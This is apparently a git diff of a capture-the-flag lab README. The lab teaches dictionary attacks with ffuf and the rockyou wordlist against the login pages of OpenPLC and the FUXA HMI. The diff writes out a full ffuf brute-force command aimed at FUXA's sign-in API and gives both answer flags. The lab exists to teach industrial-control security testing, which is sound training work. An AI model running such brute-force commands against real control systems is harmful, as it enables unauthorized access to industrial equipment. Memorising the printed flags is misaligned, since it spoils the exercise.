@@ -51,31 +51,28 @@ For more info, start it without parameters:
 ./ffuf
 ```
 
-## 🎯 Find the Flag
+## 🎯 Task
+Brute-force the login credentials for both the OpenPLC web interface and the FUXA HMI using a dictionary attack with ffuf.
+
 The flag has the format `CybICS(flag)`.
 
-**💡 Hint**: The flag is part of the user information.
+### Steps
+1. Analyze the OpenPLC login page at port 8080 (examine the request and response in the browser developer console)
+2. Install ffuf and download the rockyou.txt wordlist
+3. Run ffuf against the OpenPLC login to brute-force the admin password
+4. Log in with the discovered credentials and find the flag in the user information
+5. Apply the same approach to the FUXA HMI at port 1881
+6. Log in to FUXA and find the flag
 
 ## 🔍 Solution (OpenPLC)
 
-<details>
-  <summary><span style="color:orange;font-weight: 900">Click to expand</span></summary>
-
-  <div style="color:orange;font-weight: 900">
-    🚩 Flag: CybICS(0penPLC)
-  </div>
+**Flag:** `CybICS(0penPLC)`
 
   ![Flag OpenPLC Password](doc/flag.png)
-</details>
 
 ## 🎯 FUXA Password Attack
 Use the previous knowledge to fuzz the admin login of FUXA.
 FUXA is running at [http://<DEVICE_IP>:1881](http://<DEVICE_IP>:1881).
-
-### 🎯 Find the Flag
-The flag has the format `CybICS(flag)`.
-
-**💡 Hint**: The flag appears after successful login on the HMI.
 
 ## 🛡️ Security Framework References
 
@@ -112,19 +109,19 @@ The flag has the format `CybICS(flag)`.
 
 </details>
 
+
+## 💡 Hints
+
+- **OpenPLC**: The flag is part of the user information.
+- **FUXA**: The flag appears after successful login on the HMI.
+
 ## 🔍 Solution (FUXA)
 
-<details>
-  <summary><span style="color:orange;font-weight: 900">Click to expand</span></summary>
-
-  Run the attack:
+Run the attack:
   ```sh
   ./ffuf -v -w ./rockyou.txt -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "FUZZ"}' -raw -u http://$DEVICE_IP:1881/api/signin -fr "error"
   ```
 
-  <div style="color:orange;font-weight: 900">
-    🚩 Flag: CybICS(FU##A)
-  </div>
+**Flag:** `CybICS(FU##A)`
 
   ![Flag FUXA Password](doc/flag2.png)
-</details>
